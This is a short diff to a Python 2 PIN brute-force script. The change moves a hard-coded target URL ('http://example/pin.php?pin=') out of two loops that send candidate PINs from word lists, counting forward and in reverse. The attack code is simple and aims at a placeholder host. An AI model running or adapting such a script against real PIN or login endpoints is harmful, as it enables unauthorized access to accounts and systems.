@@ -19,14 +19,14 @@ except:
 print "[+] Starting the brute-force attack, from top to bottom and bottom to top..."
 start_time = datetime.datetime.now()
 n = 0
-m = 10 ** max - 1 
+m = 10 ** max - 1
+url = "http://example/pin.php?pin="
 
 def bruteforce():
 	global m, n
 	pins = open("PIN.txt", "r")
 	for pin in pins:
 		n += 1
-		url = "http://example/pin.php?pin="
 		furl = url + pin
 		req = urllib2.Request(furl)
 		response = urllib2.urlopen(req)
@@ -47,7 +47,6 @@ def reversebruteforce():
 	rpins = open("rPIN.txt", "r")
 	for rpin in rpins:
 		n -= 1
-		url = "http://example/pin.php?pin="
 		furl = url + rpin
 		req = urllib2.Request(furl)
 		response = urllib2.urlopen(req)
